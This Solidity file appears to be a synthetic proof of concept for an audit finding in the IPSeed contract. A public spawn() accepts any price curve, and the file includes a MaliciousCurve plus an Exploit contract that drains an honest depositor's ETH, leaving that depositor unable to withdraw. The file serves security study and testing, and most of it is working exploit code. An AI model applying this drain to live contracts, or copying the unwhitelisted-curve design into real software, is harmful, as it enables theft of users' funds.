// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Catalyst IPSeed — arbitrary IIPSeedCurve drains the ETH pool
    (Pashov Audit Group, finding C-02 / AuditVault 31586)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: spawn() is public and stores the caller-supplied curve.
    mint/burn pay that curve's quote out of the shared ETH balance.
    A second token whose curve buys at 0 and sells at the whole balance
    pulls the honest depositor's ETH. Vulnerable lines are verbatim (@> VULN). */

interface IIPSeedCurve {
    function getBuyPrice(uint256 supply, uint256 want, bytes32 curveParameters) external view returns (uint256);
    function getSellPrice(uint256 supply, uint256 sell, bytes32 curveParameters) external view returns (uint256);
}

contract HonestCurve is IIPSeedCurve {
    function getBuyPrice(uint256, uint256 want, bytes32) external pure returns (uint256) {
        return want * 10 ether;
    }

    function getSellPrice(uint256, uint256 sell, bytes32) external pure returns (uint256) {
        return sell * 10 ether;
    }
}

contract MaliciousCurve is IIPSeedCurve {
    function getBuyPrice(uint256 supply, uint256 want, bytes32 curveParameters) external pure returns (uint256) {
        if (want == 0) return supply + uint256(curveParameters);
        return 0;
    }

    function getSellPrice(uint256, uint256, bytes32) external view returns (uint256) {
        return msg.sender.balance;
    }
}

contract IPSeed {
    error InvalidTokenId();
    error TokenAlreadyExists();

    struct Metadata {
        address sourcer;
        address beneficiary;
        string name;
        string symbol;
        string projectId;
        IIPSeedCurve priceCurve;
        bytes32 curveParameters;
    }

    mapping(uint256 => Metadata) public tokenMeta;
    mapping(uint256 => mapping(address => uint256)) public balanceOf;
    mapping(uint256 => uint256) internal _totalSupply;

    function totalSupply(uint256 tokenId) public view returns (uint256) {
        return _totalSupply[tokenId];
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function computeTokenId(address sourcer, string memory projectId) public pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(sourcer, projectId)));
    }

    function computeFees(uint256) public pure returns (uint256 protocolFee, uint256 sourcerFee) {
        return (0, 0);
    }

    function spawn(
        uint256 tokenId,
        string calldata name,
        string calldata symbol,
        string calldata projectId,
        IIPSeedCurve curve,
        bytes32 curveParameters,
        address sourcer
    ) public {
        if (tokenId != computeTokenId(_msgSender(), projectId)) {
            revert InvalidTokenId();
        }
        if (bytes(tokenMeta[tokenId].projectId).length > 0) {
            revert TokenAlreadyExists();
        }

        // @> VULN: the caller-supplied curve is stored with no whitelist
        Metadata memory newMetadata = Metadata(sourcer, sourcer, name, symbol, projectId, curve, curveParameters);
        tokenMeta[tokenId] = newMetadata;
    }

    function getBuyPrice(uint256 tokenId, uint256 want)
        public
        view
        returns (uint256 gross, uint256 net, uint256 protocolFee, uint256 sourcerFee)
    {
        net = tokenMeta[tokenId].priceCurve.getBuyPrice(
            totalSupply(tokenId), want, tokenMeta[tokenId].curveParameters
        );
        (protocolFee, sourcerFee) = computeFees(net);
        gross = net + protocolFee + sourcerFee;
    }

    function getSellPrice(uint256 tokenId, uint256 sell)
        public
        view
        returns (uint256 gross, uint256 net, uint256 protocolFee, uint256 sourcerFee)
    {
        // @> VULN: the sell quote is taken from the untrusted curve and paid in ETH
        gross = tokenMeta[tokenId].priceCurve.getSellPrice(
            totalSupply(tokenId), sell, tokenMeta[tokenId].curveParameters
        );
        (protocolFee, sourcerFee) = computeFees(gross);
        net = gross - protocolFee - sourcerFee;
    }

    function mint(uint256 tokenId, uint256 amount) external payable {
        (uint256 gross,,,) = getBuyPrice(tokenId, amount);
        require(msg.value >= gross, "underpaid");
        balanceOf[tokenId][msg.sender] += amount;
        _totalSupply[tokenId] += amount;
        uint256 refund = msg.value - gross;
        if (refund != 0) {
            (bool ok,) = msg.sender.call{value: refund}("");
            require(ok, "refund");
        }
    }

    function burn(address account, uint256 tokenId, uint256 amount) public {
        require(account == msg.sender, "not holder");
        (, uint256 net,,) = getSellPrice(tokenId, amount);
        balanceOf[tokenId][account] -= amount;
        _totalSupply[tokenId] -= amount;
        (bool ok,) = account.call{value: net}("");
        require(ok, "eth transfer failed");
    }

    receive() external payable {}
}

contract HonestBuyer {
    IPSeed public ipSeed;
    HonestCurve public curve;
    uint256 public tokenId;

    constructor(IPSeed _ipSeed, HonestCurve _curve) {
        ipSeed = _ipSeed;
        curve = _curve;
    }

    function buy() external {
        tokenId = ipSeed.computeTokenId(address(this), "lab-1");
        ipSeed.spawn(tokenId, "Lab", "LAB", "lab-1", curve, bytes32(0), address(this));
        ipSeed.mint{value: 10 ether}(tokenId, 1);
    }

    function exit() external {
        ipSeed.burn(address(this), tokenId, 1);
    }

    receive() external payable {}
}

contract Exploit {
    uint256 public constant DEPOSIT = 10 ether;

    HonestCurve public honestCurve;
    MaliciousCurve public evilCurve;
    IPSeed public ipSeed;
    HonestBuyer public buyer;
    bool public victimExitOk;
    uint256 public evilTokenId;

    constructor() {
        honestCurve = new HonestCurve();
        evilCurve = new MaliciousCurve();
        ipSeed = new IPSeed();
        buyer = new HonestBuyer(ipSeed, honestCurve);
    }

    function run() external {
        buyer.buy();
        require(address(ipSeed).balance == DEPOSIT, "pool was not funded");
        require(buyer.tokenId() != 0, "lab was not spawned");

        evilTokenId = ipSeed.computeTokenId(address(this), "evil");
        ipSeed.spawn(evilTokenId, "Evil", "EVIL", "evil", evilCurve, bytes32(0), address(this));
        ipSeed.mint(evilTokenId, 1);
        require(ipSeed.balanceOf(evilTokenId, address(this)) == 1, "free mint failed");
        require(address(ipSeed).balance == DEPOSIT, "free mint took ETH");

        ipSeed.burn(address(this), evilTokenId, 1);

        (bool ok,) = address(buyer).call(abi.encodeWithSelector(buyer.exit.selector));
        victimExitOk = ok;

        require(address(this).balance == DEPOSIT, "attacker was not paid the pool");
        require(address(ipSeed).balance == 0, "pool not drained");
        require(ipSeed.balanceOf(buyer.tokenId(), address(buyer)) == 1, "victim token was burned");
        require(!victimExitOk, "victim exit succeeded");
    }

    receive() external payable {}
}
